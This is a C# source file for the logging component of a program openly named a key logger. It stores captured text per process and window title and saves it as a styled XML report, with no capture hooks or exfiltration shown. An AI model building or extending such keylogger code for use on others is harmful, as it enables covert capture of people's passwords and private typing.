using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace KeyLogger
{
    public class TextLogger
    {
        private Hashtable _logData;
        public string LogFilePath = Application.StartupPath + @"\Acitivitylog.xml";

        public TextLogger()
        {
            _logData = new Hashtable();
        }

        public void AddApplication(string applicationName)
        {
            this._logData.Add(applicationName, "");
        }

        public void Update(string applicationName, string text)
        {
            IDictionaryEnumerator en = _logData.GetEnumerator();
            while (en.MoveNext())
            {
                if (en.Key.ToString() == applicationName)
                {
                    string prlogdata = en.Value.ToString();
                    _logData.Remove(applicationName);
                    _logData.Add(applicationName, prlogdata + " " + text);
                    break;
                }
            }
        }



        public void SaveLogfile(string pathtosave)
        {
            try
            {
                string xlspath = LogFilePath.Substring(0, LogFilePath.LastIndexOf("\\") + 1) + "ApplogXSL.xsl";
                if (!File.Exists(xlspath))
                {
                    File.Create(xlspath).Close();
                    string xslcontents =
                        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"> <html> <body>  <h2>CS Key logger Log file</h2>  <table border=\"1\"> <tr bgcolor=\"Silver\">  <th>Window Title</th>  <th>Process Name</th>  <th>Log Data</th> </tr> <xsl:for-each select=\"ApplDetails/Apps_Log\"><xsl:sort select=\"ApplicationName\"/> <tr>  <td><xsl:value-of select=\"ProcessName\"/></td>  <td><xsl:value-of select=\"ApplicationName\"/></td>  <td><xsl:value-of select=\"LogData\"/></td> </tr> </xsl:for-each>  </table> </body> </html></xsl:template></xsl:stylesheet>";
                    var xslwriter = new StreamWriter(xlspath);
                    xslwriter.Write(xslcontents);
                    xslwriter.Flush();
                    xslwriter.Close();
                }
                var writer = new StreamWriter(pathtosave, false);
                IDictionaryEnumerator element = _logData.GetEnumerator();
                writer.Write("<?xml version=\"1.0\"?>");
                writer.WriteLine("");
                writer.Write("<?xml-stylesheet type=\"text/xsl\" href=\"ApplogXSL.xsl\"?>");
                writer.WriteLine("");
                writer.Write("<ApplDetails>");

                while (element.MoveNext())
                {
                    writer.Write("<Apps_Log>");
                    writer.Write("<ProcessName>");
                    string processname = "<![CDATA[" +
                                         element.Key.ToString().Trim().Substring(0,
                                                                                 element.Key.ToString().Trim().
                                                                                     LastIndexOf("######")).Trim() +
                                         "]]>";
                    processname = processname.Replace("\0", "");
                    writer.Write(processname);
                    writer.Write("</ProcessName>");

                    writer.Write("<ApplicationName>");
                    string applname = "<![CDATA[" +
                                      element.Key.ToString().Trim().Substring(
                                          element.Key.ToString().Trim().LastIndexOf("######") + 6).Trim() + "]]>";
                    writer.Write(applname);
                    writer.Write("</ApplicationName>");
                    writer.Write("<LogData>");
                    string ldata = ("<![CDATA[" + element.Value.ToString().Trim() + "]]>").Replace("\0", "");
                    writer.Write(ldata);

                    writer.Write("</LogData>");
                    writer.Write("</Apps_Log>");
                }
                writer.Write("</ApplDetails>");
                writer.Flush();
                writer.Close();
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, ex.StackTrace);
            }
        }

        private string Generatelog()
        {
            try
            {
                string Logdata = "CS Key logger Log Data" + Environment.NewLine;

                IDictionaryEnumerator element = _logData.GetEnumerator();
                while (element.MoveNext())
                {
                    string processname =
                        element.Key.ToString().Trim().Substring(0, element.Key.ToString().Trim().LastIndexOf("######")).
                            Trim();
                    string applname =
                        element.Key.ToString().Trim().Substring(element.Key.ToString().Trim().LastIndexOf("######") + 6)
                            .Trim();
                    string ldata = element.Value.ToString().Trim();

                    if (applname.Length < 25 && processname.Length < 25)
                    {
                        Logdata += applname.PadRight(25, '-');
                        Logdata += processname.PadLeft(25, '-');
                        Logdata += Environment.NewLine + "Log Data :" + Environment.NewLine;
                        Logdata += ldata + Environment.NewLine + Environment.NewLine;
                    }
                }
                Logdata += Environment.NewLine + Environment.NewLine + Environment.NewLine +
                           String.Format("LOG FILE, Data {0}", DateTime.Now.ToString());
                return Logdata;
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, ex.StackTrace);
            }
            return null;
        }
    }
}
